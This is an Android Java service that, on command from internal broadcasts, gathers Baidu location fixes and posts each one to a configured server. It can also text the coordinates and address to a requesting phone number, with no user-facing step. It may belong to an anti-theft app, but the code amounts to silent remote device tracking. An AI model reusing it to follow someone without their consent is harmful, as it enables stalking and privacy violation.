package com.candy.mergepart1;

import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.SmsManager;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;

public class BaiduMapService extends Service {
    public LocationClient mLocationClient = null;
    public static final String INTERNAL_ACTION_BAIDU = "sun.phone.baidu";
    private CodeReceiver receiver;
    private boolean ALLOW_SEND_SMS =  false;
    PendingIntent paIntent;
    SmsManager smsManager;
    String sender = null;
    public BDLocationListener myListener = new MyLocationListener();
    public BaiduMapService() {
    }

    public class CodeReceiver extends BroadcastReceiver{
        @Override
        public void onReceive(Context context, Intent intent) {
            String code = intent.getStringExtra("code");
            if(code.equals("startBaiduLocate")){
                sender = intent.getStringExtra("sender");
                ALLOW_SEND_SMS = intent.getBooleanExtra("send",false);
                if(sender!=null){
                    paIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, new Intent(), 0);
                    smsManager = SmsManager.getDefault();
                }
                if (mLocationClient != null && mLocationClient.isStarted()){
                    mLocationClient.requestLocation();
                }else{
                    mLocationClient.start();
                    mLocationClient.requestLocation();
                }
            }else if(code.equals("startBaiduFollow")){
                if (mLocationClient != null && mLocationClient.isStarted()){
                    setLocationOption(5000);
                    mLocationClient.requestLocation();
                }else{
                    mLocationClient.start();
                    setLocationOption(5000);
                    mLocationClient.requestLocation();
                }
            }else if(code.equals("stopBaiduFollow")){
                if (mLocationClient != null && mLocationClient.isStarted()){
                    setLocationOption(0);
                    mLocationClient.requestLocation();
                }else{
                    mLocationClient.start();
                    setLocationOption(0);
                    mLocationClient.requestLocation();
                }
            }else if(code.equals("stopBaiduLocate")){
                if(mLocationClient!=null){
                    mLocationClient.stop();
                }
            };
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mLocationClient = new LocationClient(getApplicationContext());
        mLocationClient.registerLocationListener(myListener);
        setLocationOption(0);
        mLocationClient.start();
        IntentFilter filter = new IntentFilter(INTERNAL_ACTION_BAIDU);
        receiver = new CodeReceiver();
        registerReceiver(receiver,filter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mLocationClient.stop();
        unregisterReceiver(receiver);
    }

    private void setLocationOption(Integer time) {
        LocationClientOption option = new LocationClientOption();
        option.setLocationMode(LocationClientOption.LocationMode.Hight_Accuracy);//设置定位模式
        option.setCoorType("bd09ll");//返回的定位结果是百度经纬度,默认值gcj02
        option.setScanSpan(time);//设置发起定位请求的间隔时间为5000ms
        option.setIsNeedAddress(true);//返回的定位结果包含地址信息
        option.setNeedDeviceDirect(true);//返回的定位结果包含手机机头的方向
        mLocationClient.setLocOption(option);
    }

    public void PostPoint(BDLocation location){
        if(location!=null){
            if(sender!=null&&smsManager!=null&&ALLOW_SEND_SMS){
                smsManager.sendTextMessage(sender, null, "(经度:"+location.getLongitude()+",纬度:"+location.getLatitude()+")"+location.getAddrStr(), paIntent,
                        null);
                sender = null;
                smsManager=null;
                paIntent=null;
            }
            Communication.post(location,getApplicationContext().getString(R.string.LocateURL),getApplicationContext());
        }
    }
/*    public void updateUi(StringBuffer sb){
        if(sb!=null){
            Intent pointIntent =new Intent(MainActivity.INTENAL_ACTION_MAIN);
            pointIntent.putExtra("latitude",sb.toString());
            sendBroadcast(pointIntent);
        }
    }*/
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    public class MyLocationListener implements BDLocationListener {
        @Override
        public void onReceiveLocation(BDLocation location) {
            if (location == null)
                return ;
            else
                PostPoint(location);
        }
    }
}
